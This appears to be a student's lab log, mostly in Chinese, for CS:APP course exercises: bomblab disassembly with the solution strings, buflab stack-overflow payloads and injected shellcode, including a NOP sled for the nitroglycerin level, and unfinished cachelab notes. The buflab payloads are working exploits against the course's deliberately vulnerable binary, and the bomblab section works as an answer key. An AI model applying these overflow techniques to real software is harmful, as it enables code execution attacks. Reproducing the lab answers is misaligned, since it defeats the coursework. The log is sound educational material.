***
CSAPP LAB   
Log during solving it    
Environment:    
sys:kali 2019-3
***

# [datalab](./datalab)
## 1.1.Questions
- make failed like this:    
fatal error: bits/libc-header-start.h:      
solution:apt-get install gcc-multilibs

# bomblab
工具：pwndebug      
> 简单来说就是达成程序要求，不让explode函数执行     
首先要明确这是一个32位程序，所以它的参数是压在栈里的    

## phase_1
对该函数进行反编译以后发现它调用了string_not_equal函数      
根据语义，猜测应该是要eax指向的字符串和0x80497c0指向的字符串相同，这个eax其实就是我们输入的第一个字符串
```
    <main>
   0x08048a5a <+170>:	push   eax ; 压入函数phase_1的参数
   0x08048a5b <+171>:	call   0x8048b20 <phase_1>
   0x08048a60 <+176>:	call   0x804952c <phase_defused>

   <phase_1>
   0x08048b26 <+6>:	mov    eax,DWORD PTR [ebp+0x8] ;这里实际上就是将上面的eax继续赋给了eax
   0x08048b29 <+9>:	add    esp,0xfffffff8
   0x08048b2c <+12>:	push   0x80497c0
   0x08048b31 <+17>:	push   eax 
   0x08048b32 <+18>:	call   0x8049030 <strings_not_equal> ;猜测该函数应该是比较了eax和0x80497c0两个字符串的大小 
   0x08048b37 <+23>:	add    esp,0x10
   0x08048b3a <+26>:	test   eax,eax
   0x08048b3c <+28>:	je     0x8048b43 <phase_1+35> ;如果返回值不是0，炸弹就会爆炸，这里进一步验证了我们的猜想
   0x08048b3e <+30>:	call   0x80494fc <explode_bomb>
```
思路:   
在push 0x80497c0处下断点，查看其值为Public speaking is very easy.验证成功。     
或者x/30cb 0x80497c0，直接查看rodata的值

## phase_2
做到这里突然对phase_defused这个函数产生了些许疑惑，它是用来干嘛的？     
偷了个懒，用ida反编译了一下，它应该是在所有炸弹全部被拆除以后才会被触发的，那就先放到一边吧
```
    <main>
    /* 这里与上面一致 */
   0x08048aa0 <+240>:	push   eax
   0x08048aa1 <+241>:	call   0x8048b98 <phase_3>

    <phase_2>
   0x08048b48 <+0>:	push   ebp
   0x08048b49 <+1>:	mov    ebp,esp
   0x08048b4b <+3>:	sub    esp,0x20
   0x08048b4e <+6>:	push   esi
   0x08048b4f <+7>:	push   ebx
   0x08048b50 <+8>:	mov    edx,DWORD PTR [ebp+0x8]
   0x08048b53 <+11>:	add    esp,0xfffffff8
   0x08048b56 <+14>:	lea    eax,[ebp-0x18]
   0x08048b59 <+17>:	push   eax
   0x08048b5a <+18>:	push   edx
   0x08048b5b <+19>:	call   0x8048fd8 <read_six_numbers> ;调用这个函数，这个函数如果通不过也会引爆炸弹
   0x08048b60 <+24>:	add    esp,0x10 ;
   /* 这一段的代码逻辑为输入的第一个数字为1 后面的每个数字是前一个数字*2 *3 ...依此类推 */
   /* 不满足条件炸弹就会引爆 */
   0x08048b63 <+27>:	cmp    DWORD PTR [ebp-0x18],0x1
   0x08048b67 <+31>:	je     0x8048b6e <phase_2+38>
   0x08048b69 <+33>:	call   0x80494fc <explode_bomb>
   0x08048b6e <+38>:	mov    ebx,0x1
   0x08048b73 <+43>:	lea    esi,[ebp-0x18]
   0x08048b76 <+46>:	lea    eax,[ebx+0x1]
   0x08048b79 <+49>:	imul   eax,DWORD PTR [esi+ebx*4-0x4]
   0x08048b7e <+54>:	cmp    DWORD PTR [esi+ebx*4],eax
   0x08048b81 <+57>:	je     0x8048b88 <phase_2+64>
   0x08048b83 <+59>:	call   0x80494fc <explode_bomb>
   0x08048b88 <+64>:	inc    ebx
   0x08048b89 <+65>:	cmp    ebx,0x5
   0x08048b8c <+68>:	jle    0x8048b76 <phase_2+46>
   /* 一直到这里其实是一个循环 */
   0x08048b8e <+70>:	lea    esp,[ebp-0x28]
   0x08048b91 <+73>:	pop    ebx
   0x08048b92 <+74>:	pop    esi
   0x08048b93 <+75>:	mov    esp,ebp
   0x08048b95 <+77>:	pop    ebp
   0x08048b96 <+78>:	ret    

   <read_six_numbers>
   0x08048fd8 <+0>:	push   ebp
   0x08048fd9 <+1>:	mov    ebp,esp
   0x08048fdb <+3>:	sub    esp,0x8
   0x08048fde <+6>:	mov    ecx,DWORD PTR [ebp+0x8]
   0x08048fe1 <+9>:	mov    edx,DWORD PTR [ebp+0xc]
   0x08048fe4 <+12>:	lea    eax,[edx+0x14]
   0x08048fe7 <+15>:	push   eax
   0x08048fe8 <+16>:	lea    eax,[edx+0x10]
   0x08048feb <+19>:	push   eax
   0x08048fec <+20>:	lea    eax,[edx+0xc]
   0x08048fef <+23>:	push   eax
   0x08048ff0 <+24>:	lea    eax,[edx+0x8]
   0x08048ff3 <+27>:	push   eax
   0x08048ff4 <+28>:	lea    eax,[edx+0x4]
   0x08048ff7 <+31>:	push   eax
   0x08048ff8 <+32>:	push   edx
   0x08048ff9 <+33>:	push   0x8049b1b
   0x08048ffe <+38>:	push   ecx 
   0x08048fff <+39>:	call   0x8048860 <sscanf@plt>
   0x08049004 <+44>:	add    esp,0x20
   0x08049007 <+47>:	cmp    eax,0x5
   0x0804900a <+50>:	jg     0x8049011 <read_six_numbers+57>
   0x0804900c <+52>:	call   0x80494fc <explode_bomb> 
   0x08049011 <+57>:	mov    esp,ebp
   0x08049013 <+59>:	pop    ebp
   0x08049014 <+60>:	ret 

```
要求输入六个数字，然后满足一定的规则
调用sscanf前的栈帧状态如下:
地址 | 值
---|---
0xffffd2a8  | main栈帧的ebp
0xffffd2a4  | 
0xffffd2a0  | 
0xffffd29c  | 
0xffffd298  | 
0xffffd294  | 
0xffffd290  |
...         |
0xffffd240  | 0xffff2da4
0xffffd240  | ...
0xffffd240  | ...
0xffffd240  | ...
0xffffd240  | ...
0xffffd240  | 0xffff2d90
0xffffd244  | "%d %d %d %d %d %d %d" 
0xffffd240  | 输入的字符串

即输入六个数字到对应的六个地址，应该是phase_2的局部变量。

## phase_3
格式化字符串为%d %c % d。
一个switch语句  第一个数字应该是swicth的跳转条件
后面的一个字符，一个数字对应限制条件(本阶段答案不唯一)
0 q 777 和 7 b 524都可，还有其他答案，我没试

## phase_4
输入一个数字，对其计算func(n)，使func(n)==0x37,观察func(n)得逻辑可知它是一个Fibonacci数列
故数字为9

## phase_5
输入6个字母,有一个array，取字母ascii码得低4位为其索引，得到另外6个字母，使其为giants
输入的字符串为opekma

## phase_6
输入6个数字，有一个长度为全局链表，结构大概是
```
struct node{
    int;
    int;
    struct node* next;
}
```
输入的六个字母让链表重新排序，让链表的第一个域按从大到小排列即可
答案：4 2 6 3 1 5

# buflab
## level0 smoke
在没有开启nitro模式下，main函数会调用test函数
```
int test()
{
  int v0; // ST1C_4
  signed int v1; // ebx

  v0 = uniqueval();
  v1 = getbuf();
  if ( uniqueval() != v0 )
    return puts("Sabotaged!: the stack has been corrupted");
  if ( v1 != cookie )
    return __printf_chk(1, "Dud: getbuf returned 0x%x\n", v1);
  __printf_chk(1, "Boom!: getbuf returned 0x%x\n", v1);
  return validate(3);
}
```
test函数又调用了getbuf函数，该函数在读取输入的时候没有做限制，可以利用rop将其返回地址改为smoke的地址。
```
payload:aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa 18 8c 04 08
```
可以利用hex2raw工具将上述字符串以字节的形式输入给程序(详细的使用方法官网给的pdf文件中有)

## level1 fizz
fizz函数与smoke函数相比多了一个条件语句，如果要求函数的参数是cookie     
根据栈帧结构，32位程序的参数在返回值上一个地址，所以相比level0 我们只需要在payload后面多加一个cookie(我假设我的uid是1，cookie位0x1c2a3245)即可（注意程序是小端存储的），另外由于将返回地址改掉以后，相当于重新调用了fizz这个函数，所以cookie的实际值应该和getbuf的返回地址中间间隔一个地址
```
payload:aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa 42 8c 04 08 aa aa aa aa 45 32 2a 1c
```

## level2 bang
与level1类似，只不过判断条件由参数==cookie变为了global_value == cookie    
首先想办法获取global_value的地址为0x804d100   
``` 
 mov $0x804d100,%eax
 movl $0x1c2a2345,(%eax)
 ret
```
利用上段汇编代码，改变global_value的值，将其存入buf   
获取buf的开始地址为0x55683b38   
> 做的过程中发现程序开启了NX，然后不会做了，参考了网络上的答案，发现他们都没有考虑这个问题，也不知道什么原因，继续按照原来的思路试试吧    

将函数的返回地址溢出为buf的首地址，运行我们的恶意代码，然后再利用ret跳到bang的地址
```
payload:b8 00 d1 04 08 c7 00 45 32 2a 1c c3 aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa e8 3b 68 55 9d 8c 04 08
```

## level3 Dynamite
题意解析: 改变getbuf函数的返回值，正常返回test，不破坏test的栈帧结构    
思路：
- 依然要向buf里面植入shellcode
```
 mov $0x1c2a3245,%eax # 改变返回值
 push $0x8048bde # 正常的返回地址压入栈
 ret
```
- 在写入payload的过程中不能破坏原有的栈帧结构，也就是说ebp不能被改变

```
payload:b8 45 32 2a 1c 68 be 8d 04 08 c3 aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa 40 3c 68 55 e8 3b 68 55
```

## level4 nitroglycerin
题意解析: 类似level3，但是要连续执行五次，每一次执行栈的基址都会随机变化，但是变化幅度在+/- 240之内，每一次都要达成level3的效果   
难点：    
- 因为栈的地址是随机变化的，无法知道buf的具体地址在哪   
  解决方法：可以知道栈地址的大概范围，将shellcode放到缓冲区的末尾部，前面用nop填充
- 因为栈地址是随机变化的，在填充过程被破坏的ebp要如何修复？   
  解决方法: 可以注意到test栈的ebp和getbuf栈的ebp地址是相对，始终相差一个0x30，当getbuf函数返回的时候esp总是等于getbuf的ebp+0x8，所以test的ebp值为esp+0x28
```
shellcode:
 mov %esp,%ebp
 add $0x28,%ebp
 mov $0x1c2a3245,%eax
 push $0x8048e3a
 ret

payload:
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 89 e5 83 c5 28 b8 45 32 2a 1c 68 3a 8e 04 08 c3 b8 45 32 2a 1c c3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 38 3b 68 55
```

# cachelab
> 这部分实验分为两部分
part A 要求模拟cache达到要求的命中率  
part B 要求对一个矩阵转置算法做优化使之能够很好的适应part A中模拟的cache

## part A
- 命令行解析
实验中给了提示，解析命令行使用GNU的getopt
命令行参数要求如下：
  ```
  • -h: Optional help flag that prints usage info
  • -v: Optional verbose flag that displays trace info
  • -s <s>: Number of set index bits (S = 2s is the number of sets)
  • -E <E>: Associativity (number of lines per set)
  • -b <b>: Number of block bits (B = 2b is the block size)
  • -t <tracefile>: Name of the valgrind trace to replay
  ```
- 解析读取的文件
  + 文件解析后存在哪里？亦或者是边解析边模拟运行？    
    先采取将文件解析并存放在一个结构数组中的方法试试（选择存放在一个结构链表里）

- 构造cache的数据结构     
  + 每行的组成为valid、tag和LRU标志位（用于使用LRU算法）

- 模拟LRU置换算法   
  仅用一个全局的时钟表示最近的使用时间，因此存在溢出可能性！
  做的过程中发现L、S、M三个属性也是有差别的，要把M拆开来

- 做的过程中发现的坑    
  解析文件的时候一定要注意细节
  例如每一行的结尾不一定是'\n'，而有可能会是空格，所以最好从开头的位置解析每一行，不要从结尾开始  
  地址长度是64位，注意不能用int表示地址
  解析出的结果我是放在链表里的，注意对链表结尾做处理（后来发现也可以用数组存放，利用realloc函数，具体效果如何未知）

本部分实验只是勉强达成要求，还有很多地方不完善，例如LRU算法的实现、程序耦合性太高、选项功能不全等

## part B
> envrionment:    
valgrind-3.16.0

思路：
- 将矩阵拆成8行8列的小矩阵(这里之前犯了一个致命的错误，s=5，误把cache表的大小也当成5了，心态直接崩掉，这部分实验以后再补吧，先这样了)

